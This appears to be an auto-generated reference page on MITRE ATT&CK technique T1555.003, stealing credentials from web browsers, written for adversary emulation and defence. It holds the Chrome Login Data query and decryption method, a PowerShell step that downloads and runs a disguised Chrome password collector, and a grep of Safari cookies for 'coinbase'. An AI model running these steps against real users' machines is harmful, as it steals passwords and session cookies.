
# Credentials from Web Browsers

## Description

### MITRE Description

> Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.

For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\Local\Google\Chrome\User Data\Default\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key. (Citation: Microsoft CryptUnprotectData ‎April 2018)
 
Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. (Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017)

Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)

After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1555/003

## Potential Commands

```
cd ~/Library/Cookies
grep -q "coinbase" "Cookies.binarycookies"
Set-Location -path "$env:TEMP\Sysinternals";
./accesschk.exe -accepteula .;
```

## Commands Dataset

```
[{'command': 'Set-Location -path "$env:TEMP\\Sysinternals";\n'
             './accesschk.exe -accepteula .;\n',
  'name': None,
  'source': 'atomics/T1555.003/T1555.003.yaml'},
 {'command': 'cd ~/Library/Cookies\n'
             'grep -q "coinbase" "Cookies.binarycookies"\n',
  'name': None,
  'source': 'atomics/T1555.003/T1555.003.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Credentials from Password Stores: Credentials from Web Browsers': {'atomic_tests': [{'auto_generated_guid': '8c05b133-d438-47ca-a630-19cc464c4622',
                                                                                                               'dependencies': [{'description': 'Modified '
                                                                                                                                                'Sysinternals '
                                                                                                                                                'must '
                                                                                                                                                'be '
                                                                                                                                                'located '
                                                                                                                                                'at '
                                                                                                                                                '#{file_path}\n',
                                                                                                                                 'get_prereq_command': '[Net.ServicePointManager]::SecurityProtocol '
                                                                                                                                                       '= '
                                                                                                                                                       '[Net.SecurityProtocolType]::Tls12\n'
                                                                                                                                                       'Invoke-WebRequest '
                                                                                                                                                       '"https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip" '
                                                                                                                                                       '-OutFile '
                                                                                                                                                       '"#{file_path}\\Modified-SysInternalsSuite.zip"\n'
                                                                                                                                                       'Expand-Archive '
                                                                                                                                                       '#{file_path}\\Modified-SysInternalsSuite.zip '
                                                                                                                                                       '#{file_path}\\sysinternals '
                                                                                                                                                       '-Force\n'
                                                                                                                                                       'Remove-Item '
                                                                                                                                                       '#{file_path}\\Modified-SysInternalsSuite.zip '
                                                                                                                                                       '-Force\n',
                                                                                                                                 'prereq_command': 'if '
                                                                                                                                                   '(Test-Path '
                                                                                                                                                   '#{file_path}\\SysInternals) '
                                                                                                                                                   '{exit '
                                                                                                                                                   '0} '
                                                                                                                                                   'else '
                                                                                                                                                   '{exit '
                                                                                                                                                   '1}\n'}],
                                                                                                               'dependency_executor_name': 'powershell',
                                                                                                               'description': 'A '
                                                                                                                              'modified '
                                                                                                                              'sysinternals '
                                                                                                                              'suite '
                                                                                                                              'will '
                                                                                                                              'be '
                                                                                                                              'downloaded '
                                                                                                                              'and '
                                                                                                                              'staged. '
                                                                                                                              'The '
                                                                                                                              'Chrome-password '
                                                                                                                              'collector, '
                                                                                                                              'renamed '
                                                                                                                              'accesschk.exe, '
                                                                                                                              'will '
                                                                                                                              'then '
                                                                                                                              'be '
                                                                                                                              'executed '
                                                                                                                              'from '
                                                                                                                              '#{file_path}.\n'
                                                                                                                              '\n'
                                                                                                                              'Successful '
                                                                                                                              'execution '
                                                                                                                              'will '
                                                                                                                              'produce '
                                                                                                                              'stdout '
                                                                                                                              'message '
                                                                                                                              'stating '
                                                                                                                              '"Copying '
                                                                                                                              'db '
                                                                                                                              '... '
                                                                                                                              'passwordsDB '
                                                                                                                              'DB '
                                                                                                                              'Opened. '
                                                                                                                              'statement '
                                                                                                                              'prepare '
                                                                                                                              'DB '
                                                                                                                              'connection '
                                                                                                                              'closed '
                                                                                                                              'properly". '
                                                                                                                              'Upon '
                                                                                                                              'completion, '
                                                                                                                              'final '
                                                                                                                              'output '
                                                                                                                              'will '
                                                                                                                              'be '
                                                                                                                              'a '
                                                                                                                              'file '
                                                                                                                              'modification '
                                                                                                                              'of '
                                                                                                                              '$env:TEMP\\sysinternals\\passwordsdb.\n'
                                                                                                                              '\n'
                                                                                                                              'Adapted '
                                                                                                                              'from '
                                                                                                                              '[MITRE '
                                                                                                                              'ATTACK '
                                                                                                                              'Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)\n',
                                                                                                               'executor': {'cleanup_command': 'Remove-Item '
                                                                                                                                               '#{file_path}\\Sysinternals '
                                                                                                                                               '-Force '
                                                                                                                                               '-Recurse '
                                                                                                                                               '-ErrorAction '
                                                                                                                                               'Ignore',
                                                                                                                            'command': 'Set-Location '
                                                                                                                                       '-path '
                                                                                                                                       '"#{file_path}\\Sysinternals";\n'
                                                                                                                                       './accesschk.exe '
                                                                                                                                       '-accepteula '
                                                                                                                                       '.;\n',
                                                                                                                            'name': 'powershell'},
                                                                                                               'input_arguments': {'file_path': {'default': '$env:TEMP',
                                                                                                                                                 'description': 'File '
                                                                                                                                                                'path '
                                                                                                                                                                'for '
                                                                                                                                                                'modified '
                                                                                                                                                                'Sysinternals',
                                                                                                                                                 'type': 'String'}},
                                                                                                               'name': 'Run '
                                                                                                                       'Chrome-password '
                                                                                                                       'Collector',
                                                                                                               'supported_platforms': ['windows']},
                                                                                                              {'auto_generated_guid': 'c1402f7b-67ca-43a8-b5f3-3143abedc01b',
                                                                                                               'description': 'This '
                                                                                                                              'test '
                                                                                                                              'uses '
                                                                                                                              '`grep` '
                                                                                                                              'to '
                                                                                                                              'search '
                                                                                                                              'a '
                                                                                                                              'macOS '
                                                                                                                              'Safari '
                                                                                                                              'binaryCookies '
                                                                                                                              'file '
                                                                                                                              'for '
                                                                                                                              'specified '
                                                                                                                              'values. '
                                                                                                                              'This '
                                                                                                                              'was '
                                                                                                                              'used '
                                                                                                                              'by '
                                                                                                                              'CookieMiner '
                                                                                                                              'malware.\n'
                                                                                                                              '\n'
                                                                                                                              'Upon '
                                                                                                                              'successful '
                                                                                                                              'execution, '
                                                                                                                              'MacOS '
                                                                                                                              'shell '
                                                                                                                              'will '
                                                                                                                              'cd '
                                                                                                                              'to '
                                                                                                                              '`~/Libraries/Cookies` '
                                                                                                                              'and '
                                                                                                                              'grep '
                                                                                                                              'for '
                                                                                                                              '`Cookies.binarycookies`.\n',
                                                                                                               'executor': {'command': 'cd '
                                                                                                                                       '~/Library/Cookies\n'
                                                                                                                                       'grep '
                                                                                                                                       '-q '
                                                                                                                                       '"#{search_string}" '
                                                                                                                                       '"Cookies.binarycookies"\n',
                                                                                                                            'name': 'sh'},
                                                                                                               'input_arguments': {'search_string': {'default': 'coinbase',
                                                                                                                                                     'description': 'String '
                                                                                                                                                                    'to '
                                                                                                                                                                    'search '
                                                                                                                                                                    'Safari '
                                                                                                                                                                    'cookies '
                                                                                                                                                                    'to '
                                                                                                                                                                    'find.',
                                                                                                                                                     'type': 'string'}},
                                                                                                               'name': 'Search '
                                                                                                                       'macOS '
                                                                                                                       'Safari '
                                                                                                                       'Cookies',
                                                                                                               'supported_platforms': ['macos']}],
                                                                                             'attack_technique': 'T1555.003',
                                                                                             'display_name': 'Credentials '
                                                                                                             'from '
                                                                                                             'Password '
                                                                                                             'Stores: '
                                                                                                             'Credentials '
                                                                                                             'from '
                                                                                                             'Web '
                                                                                                             'Browsers'}}]
```

# Tactics


* [Credential Access](../tactics/Credential-Access.md)


# Mitigations


* [Password Policies](../mitigations/Password-Policies.md)


# Actors


* [Molerats](../actors/Molerats.md)

* [APT37](../actors/APT37.md)
    
* [Patchwork](../actors/Patchwork.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [Stolen Pencil](../actors/Stolen-Pencil.md)
    
* [TA505](../actors/TA505.md)
    
* [Kimsuky](../actors/Kimsuky.md)
    
* [APT3](../actors/APT3.md)
    
* [APT33](../actors/APT33.md)
    
* [Leafminer](../actors/Leafminer.md)
    
* [OilRig](../actors/OilRig.md)
    
* [Stealth Falcon](../actors/Stealth-Falcon.md)
    
* [Inception](../actors/Inception.md)
    
* [Sandworm Team](../actors/Sandworm-Team.md)
    
* [Magic Hound](../actors/Magic-Hound.md)
    
